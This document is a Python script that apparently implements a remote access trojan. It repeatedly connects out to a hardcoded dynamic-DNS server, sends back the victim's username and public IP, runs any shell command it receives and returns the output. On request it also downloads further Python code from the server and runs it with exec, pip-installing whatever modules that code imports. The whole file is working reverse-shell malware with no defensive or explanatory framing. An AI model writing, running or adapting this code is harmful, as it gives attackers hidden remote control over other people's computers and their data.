import os
import socket
import subprocess
import json
import time
import getpass
import requests
import importlib
import subprocess
import threading

SERVER = "posydon.ddns.net"
PORT = 8080
FILEPORT = 8081

def install_module(module_name):
  try:
    importlib.import_module(module_name)
  except ImportError:
    try:
      subprocess.run(["pip", "install", module_name], check=True)
      return "Installed module: " + module_name
    except subprocess.CalledProcessError:
      raise ImportError(f"Failed to install module: {module_name}")

def execute_code(code):
  try:
    # Create a dictionary to use as the local and global namespace for execution
    exec_namespace = {}
    # Extract import statements from the code
    import_statements = [line for line in code.split('\n') if line.strip().startswith('import ') or line.strip().startswith('from ')]
    # Extract module names from import statements
    module_names = [statement.split()[1] for statement in import_statements]
    # Install any missing modules
    for module_name in module_names:
      try:
        install_module(module_name)
      except Exception as e:
        return f"Error installing {module_name}: {e}"

    # Execute the code within the specified namespace
    exec(code, exec_namespace)
    # Check if the code defines a function named 'main' and execute it if present
    if 'main' in exec_namespace and callable(exec_namespace['main']):
      output = exec_namespace['main']()
      return output
    else:
      return "Code executed successfully - no 'main' function found."
  except ImportError as e:
    return f"Error in entire function: {e}"

def execute_module(socket):
  print('executing module')
  script = requests.get(f"http://{SERVER}:{FILEPORT}/file").text
  print(script)
  result = execute_code(script)
  data_to_send = {'type': 'response_module', 'data': result}
  # Encode the dictionary as a JSON string before sending
  socket.send(json.dumps(data_to_send).encode())


while True: 		# Infinite loop to keep trying to connect
  try:
    s = socket.socket()
    s.connect((SERVER, PORT))
    s.send(json.dumps({"type": "establishment", "data": {"username": getpass.getuser(), "hostname": requests.get('https://api.ipify.org').text}}).encode());
    print('established')
    try:
      while True:
        command = s.recv(1024).decode()
        if not command:
          break
        
        if command.startswith('cd'):
          os.chdir(command.split()[1])
          result = "Successfully switched to directory: " + os.getcwd()
        elif command == "!module":
          module_thread = threading.Thread(target=execute_module(s))
          module_thread.start()
          result = "Started module execution"
        else:
          result = subprocess.getoutput(command)
          print(result)
          
        data_to_send = {'type': 'response', 'data': result}
        print(json.dumps(data_to_send).encode())
        print('sending: '+json.dumps(data_to_send))
        # Encode the dictionary as a JSON string before sending
        s.send(json.dumps(data_to_send).encode())
    except KeyboardInterrupt:
      s.send("Connection closed by the user".encode())
    finally:
      s.close()
  except Exception as e: 	# Catch any exceptions that occur during connection
    print(f"An error occurred: {e}")
    time.sleep(5) 		# Wait for 5 seconds before trying to connect again